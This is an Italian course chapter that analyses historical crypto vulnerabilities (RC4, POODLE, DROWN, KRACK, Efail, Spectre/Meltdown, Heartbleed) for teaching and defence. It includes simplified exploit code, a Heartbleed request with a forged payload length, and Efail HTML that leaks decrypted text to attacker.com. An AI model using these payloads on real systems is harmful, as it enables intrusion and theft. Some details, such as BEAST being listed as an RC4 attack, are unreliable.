# Capitolo 53 - Analisi di Vulnerabilità Storiche

> **Corso**: Sistemi e Reti 3  
> **Parte**: 13 - Progetti e Casi di Studio  
> **Autore**: Prof. Filippo Bilardo

---

## Introduzione

Analisi dettagliata di vulnerabilità crittografiche storiche e moderne.

---

## 1. RC4 Biases (2013-2015)

### Vulnerabilità

RC4 ha bias statistici negli output iniziali.

### Dimostrazione

```python
from Crypto.Cipher import ARC4
import collections

def analyze_rc4_bias():
    """Dimostra bias RC4"""
    
    # Conta secondo byte output
    second_bytes = collections.Counter()
    
    # 100.000 stream RC4
    for i in range(100000):
        key = bytes([i % 256] * 16)
        cipher = ARC4.new(key)
        keystream = cipher.encrypt(b'\x00' * 256)
        
        # Secondo byte
        second_bytes[keystream[1]] += 1
    
    # Analisi
    expected = 100000 / 256  # ~391
    
    print("=== RC4 BIAS ANALYSIS ===")
    print(f"Expected uniform: {expected:.1f}")
    print("\nTop 5 byte più frequenti:")
    for byte, count in second_bytes.most_common(5):
        bias = (count - expected) / expected * 100
        print(f"  Byte 0x{byte:02x}: {count} ({bias:+.1f}%)")
    
    # Byte 0x00 appare ~2x più spesso!
    print(f"\nByte 0x00: {second_bytes[0]} (dovrebbe essere ~{expected:.0f})")

# analyze_rc4_bias()
```

### Impatto

- **BEAST attack** su TLS
- **Bar Mitzvah attack**
- **RC4 NOMORE**

### Lezione

⚠️ **RC4 deprecato** dal 2015  
✅ Usa **ChaCha20** o **AES-GCM**

---

## 2. POODLE Attack (2014)

### Vulnerabilità

**P**adding **O**racle **O**n **D**owngraded **L**egacy **E**ncryption

SSL 3.0 padding non autenticato.

### Meccanismo

```python
# SSL 3.0 CBC Padding (vulnerabile)

def ssl3_pad(data, block_size=16):
    """SSL 3.0 padding"""
    pad_len = block_size - (len(data) % block_size)
    # ❌ Padding value è QUALSIASI!
    padding = bytes([random.randint(0, 255)] * pad_len)
    return data + padding

def ssl3_unpad(padded_data):
    """SSL 3.0 unpadding"""
    pad_len = padded_data[-1]
    # ❌ Non verifica valori padding!
    return padded_data[:-pad_len-1]

# Attaccante può manipolare padding
# Server rivela se padding valido → Oracle!
```

### Exploit

```python
# POODLE Attack (semplificato)

def poodle_attack(oracle, ciphertext, block_size=16):
    """Decifra ultimo byte di ciphertext"""
    
    # Isola ultimo blocco
    last_block = ciphertext[-block_size:]
    
    # Prova tutti i 256 valori
    for guess in range(256):
        # Modifica penultimo blocco
        modified = ciphertext[:-block_size]
        modified[-1] ^= guess
        modified += last_block
        
        # Invia a server
        if oracle.decrypt(modified):  # Padding OK?
            # Trovato byte!
            return guess
    
    return None
```

### Difesa

```python
# TLS 1.0+ PKCS#7 padding (sicuro)

def tls_pad(data, block_size=16):
    """TLS padding autenticato"""
    pad_len = block_size - (len(data) % block_size)
    # ✅ Tutti byte = pad_len
    padding = bytes([pad_len] * pad_len)
    return data + padding

def tls_unpad(padded_data):
    """TLS unpadding verificato"""
    pad_len = padded_data[-1]
    
    # ✅ Verifica tutti i byte padding
    for i in range(pad_len):
        if padded_data[-(i+1)] != pad_len:
            raise ValueError("Invalid padding")
    
    return padded_data[:-pad_len]

# ✅ Inoltre: HMAC su tutto (padding incluso)
```

### Lezione

✅ **Disabilita SSL 3.0**  
✅ **Usa TLS 1.2+**  
✅ Preferisci **AES-GCM** (no padding)

---

## 3. DROWN Attack (2016)

### Vulnerabilità

**D**ecrypting **RSA** with **O**bsolete and **W**eakened e**N**cryption

Usa SSLv2 per attaccare TLS moderno.

### Scenario

```
Server con:
├─ TLS 1.2 (moderno, sicuro)
└─ SSLv2 abilitato (vecchio, vulnerabile)

Attaccante:
├─ Intercetta TLS handshake
├─ Usa SSLv2 come oracle
└─ Decifra session key TLS!
```

### Meccanismo

```python
# SSLv2 RSA (vulnerabile)

def sslv2_rsa_decrypt_oracle(ciphertext, private_key):
    """SSLv2 decifra e rivela info"""
    
    try:
        plaintext = rsa_decrypt(ciphertext, private_key)
        
        # ❌ SSLv2 rivela se plaintext valido!
        if valid_sslv2_format(plaintext):
            return True  # Oracle dice: "valido"
        else:
            return False  # Oracle dice: "invalido"
    
    except:
        return False  # Decryption error

# Attaccante usa oracle per decifra RSA!
```

### Difesa

```bash
# Disabilita SSLv2 completamente

# Apache
SSLProtocol all -SSLv2 -SSLv3

# Nginx
ssl_protocols TLSv1.2 TLSv1.3;

# OpenSSL
openssl s_client -connect server:443 -ssl2
# Deve fallire!
```

### Lezione

✅ **Disabilita protocolli legacy**  
✅ **Non riusare chiavi** tra protocolli  
✅ **Audit configurazioni** regolarmente

---

## 4. KRACK Attack (2017)

### Vulnerabilità

**K**ey **R**einstallation **A**tta**ck** su WPA2

### WPA2 4-Way Handshake

```
Client                    AP
  │                        │
  │◄─── ANonce ────────────┤  1
  │                        │
  ├──── SNonce + MIC ─────►│  2
  │                        │
  │◄─── GTK + MIC ─────────┤  3
  │                        │
  ├──── ACK ──────────────►│  4
```

### Vulnerabilità

```python
# Vulnerability: Message 3 può essere ritrasmesso

# Normale:
Client: Riceve msg 3 → Installa chiave → Invia msg 4

# Attacco:
Attacker: Blocca msg 4
AP: Ritrasmette msg 3 (pensa perso)
Client: Reinstalla STESSA chiave → ❌ Nonce reset!

# Con nonce reset:
# - Stessa chiave + stesso nonce = Reuse keystream!
# - Possibile decifrazione
```

### Exploit

```python
# KRACK attack (concettuale)

def krack_attack():
    """Sfrutta nonce reuse"""
    
    # 1. Intercetta handshake
    # 2. Blocca ACK (msg 4)
    # 3. AP ritrasmette msg 3
    # 4. Client reinstalla chiave → NONCE RESET
    
    # 5. Cattura due pacchetti con stesso nonce
    packet1 = intercept_packet()  # Nonce = N
    packet2 = intercept_packet()  # Nonce = N (stesso!)
    
    # 6. XOR attack
    # C1 = P1 ⊕ K
    # C2 = P2 ⊕ K
    # C1 ⊕ C2 = P1 ⊕ P2
    
    xor_result = xor(packet1, packet2)
    
    # Se P1 noto (es. HTTP header)
    # → P2 = xor_result ⊕ P1
    
    return xor_result
```

### Difesa

```bash
# Patch firmware router e dispositivi

# Linux: wpa_supplicant patch
sudo apt update && sudo apt upgrade

# Verifica vulnerabilità
sudo apt install krackattacks-test-ap-ft
```

### Lezione

✅ **WPA3** per nuove reti  
✅ **Patch devices** immediatamente  
✅ **TLS over WiFi** (defense in depth)

---

## 5. Efail Attack (2018)

### Vulnerabilità

PGP/S/MIME cifratura email con HTML.

### Meccanismo

```html
<!-- Email cifrata originale -->
<encrypted>SECRET_DATA</encrypted>

<!-- Attaccante modifica HTML -->
<img src="http://attacker.com/leak?data=<encrypted>SECRET_DATA</encrypted>">

<!-- Email client -->
1. Decifra <encrypted> → "Password123"
2. Rende HTML
3. Carica immagine da:
   http://attacker.com/leak?data=Password123
   
🚨 Leak plaintext a attaccante!
```

### Exploit

```python
# Efail attack (semplificato)

def efail_attack(encrypted_email):
    """Modifica email cifrata per leak"""
    
    # 1. Intercetta email cifrata
    ciphertext = extract_ciphertext(encrypted_email)
    
    # 2. Inietta HTML malevolo
    malicious_html = f'''
    <img src="https://attacker.com/leak?
    <pgp-encrypted>{ciphertext}</pgp-encrypted>
    ">
    '''
    
    # 3. Invia email modificata a vittima
    # 4. Vittima apre email → client decifra e rende HTML
    # 5. Browser carica immagine → leak plaintext!
    
    return malicious_html
```

### Difesa

```python
# Disabilita rendering HTML in email client

# Thunderbird
user_pref("mailnews.display.html_as", 1);  # Plain text

# Gmail
# Settings → Display images → Ask before displaying

# Usa S/MIME con autenticazione
# Verifica firma prima rendering
```

### Lezione

✅ **Plaintext email** per messaggi cifrati  
✅ **Disabilita HTML** in mail client  
✅ **Authenticated encryption** (GCM)

---

## 6. Spectre/Meltdown (2018)

### Vulnerabilità

Side-channel via **speculative execution** CPU.

### Meltdown

```c
// Meltdown exploit (semplificato)

// Memoria kernel (inaccessibile)
char *kernel_memory = 0xFFFFFFFF00000000;

// Leggi memoria kernel
char secret = *kernel_memory;  // ❌ Dovrebbe fallire

// Ma CPU esegue speculativamente:
char cache_load = probe_array[secret * 4096];

// Exception arriva DOPO cache load!
// Attaccante misura tempo cache → leak secret!
```

### Spectre

```c
// Spectre exploit (training branch predictor)

if (x < array_size) {  // Boundary check
    y = array[x];
}

// Attacco:
// 1. "Train" branch predictor con x validi
// 2. Poi usa x OLTRE array_size
// 3. CPU esegue speculativamente array[x] 
//    prima di verificare boundary!
// 4. Side-channel → leak memory!
```

### Difese

```bash
# Patch kernel
sudo apt update && sudo apt upgrade linux-image-*

# Disabilita hyper-threading (drastico)
echo off > /sys/devices/system/cpu/smt/control

# Compile con mitigazioni
gcc -mindirect-branch=thunk -mfunction-return=thunk
```

### Lezione

✅ **Side-channels** sono reali  
✅ **Hardware** può essere vulnerabile  
✅ **Constant-time code** critico

---

## 7. Heartbleed (2014) - Analisi Dettagliata

### Codice Vulnerabile

```c
// OpenSSL heartbeat (vulnerabile)

int dtls1_process_heartbeat(SSL *s) {
    unsigned char *p = &s->s3->rrec.data[0];
    unsigned char *pl;
    unsigned short hbtype;
    unsigned int payload;
    unsigned int padding = 16;
    
    hbtype = *p++;
    n2s(p, payload);  // ❌ Non verifica!
    pl = p;
    
    // ❌ Alloca buffer senza check
    unsigned char *buffer = OPENSSL_malloc(1 + 2 + payload + padding);
    
    // ❌ Copia payload (può essere oltre reale!)
    memcpy(bp, pl, payload);  // 💀 Buffer over-read!
    
    // Invia risposta (con memoria extra!)
    return dtls1_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding);
}
```

### Exploit

```python
# Heartbleed exploit

def heartbleed(target, port=443):
    """Exploit Heartbleed"""
    
    # TLS Heartbeat packet
    heartbeat = bytearray([
        0x18,  # Content Type: Heartbeat
        0x03, 0x02,  # TLS version
        0x00, 0x03,  # Length
        0x01,  # Type: Request
        0xFF, 0xFF,  # ❌ Payload length: 65535 (FAKE!)
        # Payload reale: solo 1 byte
        0x41  # 'A'
    ])
    
    sock = connect_ssl(target, port)
    sock.send(heartbeat)
    
    # Ricevi risposta (65535 byte!)
    response = sock.recv(65535)
    
    # Response contiene:
    # - 'A' (payload)
    # - 65534 byte di MEMORIA!
    
    return response[3:]  # Skip header

# Memoria può contenere:
# - Chiavi private
# - Session cookies
# - Password
# - Dati utenti
```

### Timeline Difesa

```
2014-04-07: Scoperta pubblica
2014-04-07: Patch rilasciato
2014-04-08: ~17% server vulnerabili
2014-04-15: ~9% server vulnerabili
2015-01-01: ~1% ancora vulnerabili
```

### Lezione

✅ **Bounds checking** sempre  
✅ **Input validation** rigorosa  
✅ **Memory-safe** languages  
✅ **Fuzzing** automatico

---

## Conclusioni

### Pattern Ricorrenti

1. **Missing validation**: Heartbleed, POODLE
2. **Protocol confusion**: DROWN, Efail
3. **Side-channels**: Spectre, RC4 bias
4. **Timing attacks**: KRACK nonce reuse
5. **Legacy protocols**: SSLv2, SSLv3, RC4

### Lezioni Universali

```
1. Defense in Depth
   └─ Un layer fallisce → altri proteggono

2. Principle of Least Privilege
   └─ Minimizza superficie attacco

3. Fail Securely
   └─ Errori non devono leakare info

4. Crypto Agility
   └─ Facile migrare ad algoritmi nuovi

5. Keep It Simple
   └─ Complessità = vulnerabilità

6. Patch Promptly
   └─ 0-day diventa N-day velocemente
```

---

## 🔗 Collegamenti

- **Precedente**: [Capitolo 52 - Casi di Studio](52_casi_di_studio.md)
- **Indice**: [Torna all'indice](../00_INDICE.md)

---

## 📚 Riferimenti Completi

- **CVE**: https://cve.mitre.org
- **NIST NVD**: https://nvd.nist.gov
- **CWE**: https://cwe.mitre.org
- **Exploit DB**: https://www.exploit-db.com
- **OWASP**: https://owasp.org

**Fine del Corso di Crittografia e Sicurezza!** 🎓
